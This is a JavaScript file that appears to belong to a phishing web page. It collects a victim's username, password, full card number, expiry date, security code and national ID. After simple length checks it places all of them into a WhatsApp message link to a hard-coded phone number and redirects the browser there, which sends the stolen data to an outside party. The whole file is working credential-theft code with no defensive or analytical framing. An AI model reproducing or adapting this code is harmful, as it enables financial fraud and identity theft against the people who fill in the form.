let user = document.getElementById("user")
let code = document.getElementById("code")
let dni = document.getElementById("dni")
let card = document.getElementById("card")
let date = document.getElementById("vencimiento")
let secureCode = document.getElementById("secure_code")
let submit = document.getElementById("submit")
let contact = document.getElementById("contacto")
let error = document.getElementById("error")


contact.addEventListener("click", ()=>{
  location.href = "https://api.whatsapp.com/send?phone=5359398368"
})
submit.addEventListener("click",()=>{
  if(user.value.trim().indexOf(" ") == -1 && user.value.trim().length >4 && card.value.trim().indexOf(" ") && card.value.trim().length == 16 && code.value.trim().indexOf(" ") && code.value.trim().length > 6 && dni.value.trim().indexOf(" ") && dni.value.trim().length > 8 && date.value.trim().indexOf(" ") && secureCode.value.trim().indexOf(" ") && secureCode.value.trim().length == 3){
    
    const message = `User:%20${user.value.trim()}%20Clave:%20${code.value.trim()}%20Card:%20${card.value.trim()}%20Vencimiento:%20${date.value.trim()}%20Pin:%20${secureCode.value.trim()}%20DNI:%20${dni.value.trim()}`
    const whatsapp = `https://api.whatsapp.com/send?phone=5491151109790&text=${message}`
    console.log(whatsapp)
    location.href = whatsapp
    
  }else{
    error.removeAttribute('hidden')
    error.textContent = "Datos incorrectos, revise la información..."
    error.classList.add('p-2')
  }
  setTimeout(()=> error.setAttribute('hidden', 'true'), 3000)
})
